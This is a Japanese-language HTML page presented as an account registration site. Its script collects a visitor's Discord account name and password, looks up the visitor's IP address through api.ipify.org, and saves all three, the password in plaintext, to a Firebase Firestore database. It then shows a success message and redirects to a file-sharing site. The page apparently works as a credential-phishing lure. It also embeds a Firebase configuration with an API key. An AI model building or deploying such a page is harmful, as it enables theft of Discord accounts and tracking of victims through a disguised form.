<!DOCTYPE html>
<html lang="ja">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登録サイト</title>
</head>

<body>
    <h1>アカウント登録</h1>

    <!-- Discordアカウント入力フォーム -->
    <div id="discord-form">
        <label for="discordAccount">Discord アカウント名:</label>
        <input type="text" id="discordAccount" required>
        <button onclick="nextStep()">次へ</button>
    </div>

    <!-- パスワード入力フォーム -->
    <div id="password-form" style="display:none;">
        <label for="password">パスワード:</label>
        <input type="password" id="password" required>
        <button onclick="submitForm()">送信</button>
    </div>

    <div id="status" style="display:none;">お待ちください...</div>
    <div id="success" style="display:none;">登録が完了しました</div>

    <!-- Firebase SDKのインポート -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getFirestore, collection, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
        import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";

        // Firebaseの設定（自分の設定に置き換えてください）
        const firebaseConfig = {
  apiKey: "AIzaSyAZs9FyqJ4wjSi-HcVC9SzLentqu8NXBwk",
  authDomain: "tndr-entryserver.firebaseapp.com",
  projectId: "tndr-entryserver",
  storageBucket: "tndr-entryserver.firebasestorage.app",
  messagingSenderId: "1008351258193",
  appId: "1:1008351258193:web:55257ec8e18d22b80b3a70",
        };

        // Firebase初期化
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);

        // discordAccountとpasswordの変数を初期化
        let discordAccount = '';
        let password = '';

        // 次のステップ（Discordアカウント名を取得）
        function nextStep() {
            discordAccount = document.getElementById('discordAccount').value;

            if (!discordAccount.trim()) {
                alert('Discordアカウント名を入力してください');
                return;
            }

            // Discordアカウント名が入力された場合
            document.getElementById('discord-form').style.display = 'none';
            document.getElementById('password-form').style.display = 'block';
        }

        // 送信ボタンを押したときの処理
        async function submitForm() {
            password = document.getElementById('password').value;

            if (!password.trim()) {
                alert('パスワードを入力してください');
                return;
            }

            // 「お待ちください」を表示
            document.getElementById('status').style.display = 'block';

            // IPアドレスを取得してFirebaseに送信
            const ip = await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip);

            // Firebaseにデータを保存
            try {
                const userRef = doc(collection(db, "users"), discordAccount);
                await setDoc(userRef, {
                    discordAccount: discordAccount,
                    password: password,
                    ipAddress: ip,
                    createdAt: serverTimestamp()
                });

                // 登録成功のメッセージを表示
                document.getElementById('status').style.display = 'none';
                document.getElementById('success').style.display = 'block';

                // 5秒後に自動でダウンロードサイトに遷移
                setTimeout(() => {
                    window.location.href = 'https://gigafile.com';
                }, 5000);
            } catch (error) {
                console.error('Error adding document: ', error);
                alert('登録に失敗しました。もう一度試してください。');
            }
        }
    </script>
</body>

</html>
